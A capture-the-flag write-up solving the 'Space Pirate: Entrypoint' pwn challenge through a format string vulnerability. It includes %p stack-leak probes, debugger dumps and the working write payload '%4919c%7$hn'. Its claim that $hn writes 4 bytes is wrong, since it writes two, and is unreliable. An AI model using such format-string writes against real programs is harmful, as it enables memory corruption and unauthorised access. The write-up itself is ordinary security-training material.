# Space Pirate:Entrypoint

### Challenge: PWN

### Tools: Ghidra, Pwndbg

### Vulnerability: Format String

This challenge is in the form of a format string  vulnerability. Since I had never used one I followed these links for a very good run down on a format string attack.

https://kevinalmansa.github.io/application%20security/Format-Strings

https://infosecwriteups.com/exploiting-format-string-vulnerability-97e3d588da1b

Below is the main function where our vulnerability sits. The check_pass function has no actual vulnerability.




We can see that local 48 = 0xdeadbeef but if local_48 = 0xdead1337 then it will open_door which is the function that prints our flag. So our goal is to change the value of 0xdeadbeef to 0xdead1337.
Now the way I actually figured out there was a format string vulnerability was by putting in different % commands to see if anything happened and luckily I found that %p was printing addresses. %s and %n will cause a segmentation fault.

```
(base) ┌──(rogue1㉿rogue1)-[~/HTB/CTF/Apocalypse2022/challenge]
└─$ ./sp_entrypoint          


                         Authentication System

▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
▓▓▓▓▓▓▓▓▓▓          ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓          ▓▓▓▓▓▓▓▓▓
▓▓▓▓▓▓▓▓▓▓          ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓          ▓▓▓▓▓▓▓▓▓                                                                   
▓▓▓▓▓▓▓▓▓▓          ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓          ▓▓▓▓▓▓▓▓▓                                                                   
▓▓▓▓▓▓▓▓▓▓     ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓     ▓▓▓▓▓▓▓▓▓                                                                   
▓▓▓▓▓▓▓▓▓▓     ▓▓▓▒▒▓▓▓▒▒▒▒▒▓▓▒░▒▓▓▓░░▓▓▓▓▓  ░  ▓▓▓  ▓▓▓  ▓▓▓  ▓▓▓     ▓▓▓▓▓▓▓▓▓                                                                   
▓▓▓▓▓▓▓▓▓▓     ▓▓▓▒▒▓▓▓▒▒▒▒▒▓▓░░░▓▓▓▒░▓▓▓▓▓ ░   ▓▓▓  ▓▓▓  ▓▓▓  ▓▓▓     ▓▓▓▓▓▓▓▓▓                                                                   
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒▒▒▒▒▓▓░░░▓▓▓░░▓▓▓▓▓     ▓▓▓  ▓▓▓  ▓▓▓  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓                                                                   
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒▒▒▒░▓▓░░░▓▓▓░░▓▓▓▓▓     ▓▓▓  ▓▓▓  ▓▓▓  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓                                                                   
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒▒▒▒▒▓▓▒░░▓▓▓░░▓▓▓▓▓     ▓▓▓  ▓▓▓  ▓▓▓  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓                                                                   
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒▒▒▒░▓▓░░░▓▓▓░ ▓▓▓▓▓     ▓▓▓  ▓▓▓  ▓▓▓  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓                                                                   
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒▒▒▒▒▓▓░░░▓▓▒░░▓▓▓▓▓     ▓▓▓  ▓▓▓  ▓▓▓  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓                                                                   
▓▓▓▓▓▓▓▓▓▓▓▓                                                        ▓▓▓▓▓▓▓▓▓▓▓▓                                                                   
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒▒░░░▓▓░░░▓▓▒░ ▓▓▓▓▓     ▓▓▓  ▓▓▓  ▓▓▓  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓                                                                   
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒░░░▒▓▓░░░▓▓▒ ░▓▓▓▓▓     ▓▓▓  ▓▓▓  ▓▓▓  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓                                                                   
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓░░░░░▓▓░░░▓▓▓  ▓▓▓▓▓     ▓▓▓  ▓▓▓  ▓▓▓  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓                                                                   
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░▓▓▓▒░░░░▓▓▒  ▓▓▒  ▓▓▓▓▓     ▓▓▓  ▓▓▓  ▓▓▓  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓                                                                   
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓     ▓▓▓▓▓▓▓▓▓▓▓▓▓  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓                                                                   
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓░▒░░░▓▓░  ▓▓▒  ▓▓▓▓▓     ▓▓▓  ▓▓▓  ▓▓▓  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓                                                                   
▓▓▓▓▓▓▓▓▓▓     ▓▓▓░▒▓▓▓░░░░░▓▓░  ▓▓▒  ▓▓▓▓▓     ▓▓▓  ▓▓▓  ▓▓▓  ▓▓▓     ▓▓▓▓▓▓▓▓▓                                                                   
▓▓▓▓▓▓▓▓▓▓     ▓▓▓▒░▓▓▓░░░░ ▓▓   ▓▓▒  ▓▓▓▓▓     ▓▓▓  ▓▓▓  ▓▓▓  ▓▓▓     ▓▓▓▓▓▓▓▓▓                                                                   
▓▓▓▓▓▓▓▓▓▓     ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓     ▓▓▓▓▓▓▓▓▓                                                                   
▓▓▓▓▓▓▓▓▓▓          ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓          ▓▓▓▓▓▓▓▓▓                                                                   
▓▓▓▓▓▓▓▓▓▓          ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓          ▓▓▓▓▓▓▓▓▓                                                                   
▓▓▓▓▓▓▓▓▓▓          ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓          ▓▓▓▓▓▓▓▓▓                                                                   
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓                                                                   
                                                                                                                                                   
                                                                                                                                                   
1. Scan card 💳                                                                                                                                    
2. Insert password ↪                                                                                                                               
> 1                                                                                                                                                
                                                                                                                                                   
[!] Scanning card.. Something is wrong!                                                                                                            
                                                                                                                                                   
Insert card's serial number: %p %p %p %p %p %p %p %p %p %p %p %p                                                                                   
                                                                                                                                                   
Your card is: 0x7ffdfc86f2d0 0x7f734ef768c0 (nil) 0xf (nil) 0xdeadbeef 0x7ffdfc871970 0x7025207025207025 0x2520702520702520 0x2070252070252070     
                                                                                                                                                   
[-] Invalid ID! Intruder detected! 🚨 🚨 ```                                                                                                          
                                                

By inputting a couple of %p we can see that the address 0xdeadbeef is at offset 6 and input data is put into offset 7. Anything after becomes arbitrary.


```$rax   : 0x0               
$rbx   : 0x0               
$rcx   : 0x007ffff7af2031  →  0x5777fffff0003d48 ("H="?)
$rdx   : 0x1f              
$rsp   : 0x007fffffffdce0  →  0x00000000deadbeef
$rbp   : 0x007fffffffdd20  →  0x00555555400e20  →  <__libc_csu_init+0> push r15
$rsi   : 0x007fffffffdcf0  →  "%p %p %p %p %p %p %p %p %p %p\n"
$rdi   : 0x00555555402658  →  "\nYour card is: "
$rip   : 0x00555555400d84  →  <main+142> call 0x5555554008a0 <printf@plt>
$r8    : 0x47              
$r9    : 0x0               
$r10   : 0x007ffff7b80bc0  →  0x0002000200020002
$r11   : 0x246             
$r12   : 0x00555555400940  →  <_start+0> xor ebp, ebp
$r13   : 0x007fffffffde00  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero CARRY PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
─────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffdce0│+0x0000: 0x00000000deadbeef     ← $rsp
0x007fffffffdce8│+0x0008: 0x007fffffffdce0  →  0x00000000deadbeef
0x007fffffffdcf0│+0x0010: "%p %p %p %p %p %p %p %p %p %p\n"      ← $rsi
0x007fffffffdcf8│+0x0018: " %p %p %p %p %p %p %p\n"
0x007fffffffdd00│+0x0020: "p %p %p %p %p\n"
0x007fffffffdd08│+0x0028: 0x000a7025207025 ("%p %p\n"?)
0x007fffffffdd10│+0x0030: 0x007fffffffde00  →  0x0000000000000001
0x007fffffffdd18│+0x0038: 0x10674ff2d0c4b300
───────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555400d73 <main+125>       call   0x5555554008c0 <read@plt>
   0x555555400d78 <main+130>       lea    rdi, [rip+0x18d9]        # 0x555555402658
   0x555555400d7f <main+137>       mov    eax, 0x0
 → 0x555555400d84 <main+142>       call   0x5555554008a0 <printf@plt>
   ↳  0x5555554008a0 <printf@plt+0>   jmp    QWORD PTR [rip+0x2026ea]        # 0x555555602f90 <printf@got.plt>
      0x5555554008a6 <printf@plt+6>   push   0x4
      0x5555554008ab <printf@plt+11>  jmp    0x555555400850
      0x5555554008b0 <alarm@plt+0>    jmp    QWORD PTR [rip+0x2026e2]        # 0x555555602f98 <alarm@got.plt>
      0x5555554008b6 <alarm@plt+6>    push   0x5
      0x5555554008bb <alarm@plt+11>   jmp    0x555555400850
───────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
printf@plt (
   $rdi = 0x00555555402658 → "\nYour card is: ",
   $rsi = 0x007fffffffdcf0 → "%p %p %p %p %p %p %p %p %p %p\n",
   $rdx = 0x0000000000001f
)
───────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "sp_entrypoint", stopped 0x555555400d84 in main (), reason: BREAKPOINT
─────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555400d84 → main()
──────────────────────────────────────────────────────────────────────────────────────────────────────────
Python Exception <class 'AttributeError'> partially initialized module 'pwndbg' has no attribute 'commands' (most likely due to a circular import): 
gef➤  x50x $rsp
Undefined command: "x50x".  Try "help".
gef➤  x/50x $rsp
0x7fffffffdce0: 0xdeadbeef      0x00000000      0xffffdce0      0x00007fff
0x7fffffffdcf0: 0x25207025      0x70252070      0x20702520      0x25207025
0x7fffffffdd00: 0x70252070      0x20702520      0x25207025      0x00000a70
0x7fffffffdd10: 0xffffde00      0x00007fff      0xd0c4b300      0x10674ff2
0x7fffffffdd20: 0x55400e20      0x00005555      0xf7a03c87      0x00007fff
0x7fffffffdd30: 0x00000001      0x00000000      0xffffde08      0x00007fff
0x7fffffffdd40: 0x00008000      0x00000001      0x55400cf6      0x00005555
0x7fffffffdd50: 0x00000000      0x00000000      0xd40bc83c      0x088c5f78
0x7fffffffdd60: 0x55400940      0x00005555      0xffffde00      0x00007fff
0x7fffffffdd70: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffdd80: 0x722bc83c      0x5dd90a07      0xb035c83c      0x5dd91ab8
0x7fffffffdd90: 0x00000000      0x00007fff      0x00000000      0x00000000
0x7fffffffdda0: 0x00000000      0x00000000
gef➤
```
 

So now that we know where we need to point the format string attack we can set up the command. Also we only need to change the last 2 bytes for the attack

Command = `%4919c%7$hn`	
	- 1337=4919(last 4 of dead1337 from hex) 
  - c= prints character
  - %7=the offset we are placing the $hn 
  - $hn=writes 4 bytes to the target pointer.






With that we have our flag!

When I first started out I think I was diving too deep and trying scripts like `“dead1337””\x20\xdf\xff\xff””%7$n”` to print the flag but eventually realized this challenge was simpler than that.

